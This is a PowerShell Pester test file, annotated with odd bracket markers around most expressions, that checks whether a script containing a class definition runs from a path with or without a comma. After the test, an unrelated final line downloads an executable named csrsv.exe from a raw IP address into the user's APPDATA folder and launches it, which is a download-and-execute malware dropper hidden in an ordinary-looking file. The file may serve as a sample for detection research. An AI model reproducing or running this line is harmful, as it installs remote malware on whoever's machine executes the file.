

 -||-> Describe "Script with a class definition run path" -Tags "CI" {

     -||-> $TestCases = @(
         -||-> @{ FileName =   -||-> 'MyTest.ps1' <-||- ; Name =  -||-> 'path without a comma' <-||-  } <-||- 
         -||-> @{ FileName =  -||-> 'My,Test.ps1' <-||- ; Name =  -||-> 'path with a comma' <-||-     } <-||- 
    ) <-||- 

     -||-> It "Script with a class definition can run from a <Name>" -TestCases $TestCases {
        param( $FileName )

         -||-> $FilePath =  -||-> Join-Path -Path $TestDrive -ChildPath $FileName <-||-  <-||- 

 -||-> @'
class MyClass { static [string]$MyProperty = 'Some value' }
[MyClass]::MyProperty
'@ | Out-File -FilePath $FilePath <-||- 

         -||-> (  -||-> . $FilePath <-||-  ) | Should -Match 'Some value' <-||- 
    } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



